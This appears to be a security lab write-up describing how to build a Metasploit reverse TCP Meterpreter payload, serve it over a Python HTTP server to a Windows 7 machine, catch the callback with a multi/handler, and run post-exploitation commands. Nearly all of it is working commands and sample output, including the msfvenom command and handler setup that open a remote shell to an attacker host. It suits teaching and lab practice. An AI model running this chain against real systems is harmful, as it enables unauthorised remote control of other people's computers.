
### Objective

To generate a malicious reverse TCP payload using Metasploit, deliver it to a Windows machine, establish a Meterpreter session, and perform basic post-exploitation tasks.

---
### Tools Used
- **Kali Linux** (Attacker Machine)
- **Metasploit Framework**
- **Python HTTP Server**
- **Windows 7** (Victim Machine)

---
### Theory

- **Metasploit Framework** provides powerful modules to generate payloads, deliver them, and handle reverse connections.
- A **reverse TCP payload** connects back from the victim to the attackerâ€™s machine.
- Once executed, a **Meterpreter session** is opened, allowing system information gathering, file browsing, and process listing.
---
### Commands:
### 1. Identify IP Address
On Kali Linux
```bash
ip a
```

On Windows
```bash
ipconfig
```

### 2. Generate Payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_Kali_IP> LPORT=1234 -f exe -o payload.exe
```

Possible Output:
```bash
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: payload.exe
```

### 3. Host Payload
```bash
python3 -m http.server 80
```

Possible Output:
```bash
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
<Your_Windows_IP> - - [Date Time] "GET /payload.exe HTTP/1.1" 200 -
```

### 4. Download Payload on Windows
```bash
http://<Your_Kali_IP>/              # Downlad the payload
```

### 5. Start Metasploit Handler
```bash
msfconsole
```

Inside Metasploit:
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <Your_Kali_IP>
set LPORT 1234
run
```

Possible Output:
```bash
[*] Started reverse TCP handler on <Your_Kali_IP>:1234
[*] Sending stage (203846 bytes) to <Your_Windows_IP>
[*] Meterpreter session 1 opened (<Your_Kali_IP>:1234 -> <Your_Windows_IP>:49177)
```

### 6. Post Exploitation
```bash
sysinfo              # Get System Information
getuid               # Get Current User
pwd                  # Check Current Directory
ls                   # List Files
ps                   # View Running Processes
```